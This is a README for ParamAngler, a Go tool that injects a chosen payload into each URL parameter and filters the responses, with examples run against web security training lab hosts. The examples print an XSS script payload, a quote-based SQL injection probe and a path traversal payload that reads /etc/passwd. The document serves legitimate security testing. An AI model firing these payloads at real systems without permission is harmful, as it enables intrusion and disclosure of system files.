# ParamAngler

Introducing ParamAngler - the ultimate tool for testing specific payloads on each parameter. The name ParamAngler is a combination of two words - 'parameters' and 'angler'. An angler is someone who enjoys fishing with a rod and line, and with ParamAngler, you can fish for bugs on a much larger scale.

Whether you're looking for XSS, LFI, SQLi, or other vulnerabilities in your web application, ParamAngler has got you covered. With its powerful and easy-to-use features, you can search for reflected parameters, test for payloads, and much more.

Say goodbye to tedious manual testing and hello to ParamAngler - your new go-to tool for comprehensive and efficient web application testing. Try ParamAngler today and start reeling in those bugs!

# Instalation

With go you can use this command

```
go install github.com/spyx/ParamAngler@latest
```

# Usage

```bash
$ ParamAngler  -h                       

.__               .__.           
[__) _.._. _.._ _ [__]._  _ | _ ._.
|   (_][  (_][ | )|  |[ )(_]|(/,[  
                         ._|       


Remember that bug bounty and security tools should only be used ethically and responsibly.
Misuse of these tools can lead to harm and legal consequences.
Use these tools with caution and obtain permission before performing any testing or analysis.

Usage: ParamAngler [OPTIONS]
Options:
  -a    flag indicating whether to append payload to existing parameter value or replace it entirely
  -f string
        input file containing list of URLs
  -h    display usage information
  -mc string
        HTTP response code(s) to filter on (comma-separated)
  -ms string
        String to search for in the response body
  -p string
        payload to replace or append parameter values with
  -s    hide banner
  -t int
        Number of goroutines to use (default 1)
  -x string
        set up proxy exampe: http://127.0.0.1:8080

```

## Example of testing XSS

```
cat xss.txt | ParamAngler -mc 200 -ms alert -p "<script>alert(1)</script>" -t 10 -s                              
https://0abd007403fc917cc561317200f20054.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

We are filter responses to return only **200** code and there has to be **alert** text in response body. We alse set -s parameter to sillent banner and set thread by -t flag to 10 


## Example of SQLi testing

```
cat sql.txt | ParamAngler -mc 500 -p \' -a -t 20
https://0a7e001a039591bfc50737d800250075.web-security-academy.net/filter?category=Lifestyle%27
https://0a7e001a039591bfc50737d800250075.web-security-academy.net/filter?category=Corporate+gifts-%27
https://0a7e001a039591bfc50737d800250075.web-security-academy.net/filter?category=Corporate+gifts%27
https://0a7e001a039591bfc50737d800250075.web-security-academy.net/filter?category=Accessories%27
https://0a7e001a039591bfc50737d800250075.web-security-academy.net/filter?category=Pets%27
https://0a7e001a039591bfc50737d800250075.web-security-academy.net/filter?category=Corporate+gifts%22%27
```

We use simple quote as payload but with -a flag we append this quote to existing payload. We are filtering by 500 error code which usually can suggest SQLinjection


## Example of LFI

```
cat lfi.txt | go run main.go -ms root -p "../../../../../etc/passwd" -t 10
https://0a21001903252a0ac0e5727c0060004c.web-security-academy.net/image?filename=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd  
```

Similar as XSS example but now we are looking for root string on response body

## TODO

- [x] - Add support for proxy  
- [ ] - add encoding possibilities (base64, urlencode, double url encode)
- [ ] - try to add cookie options 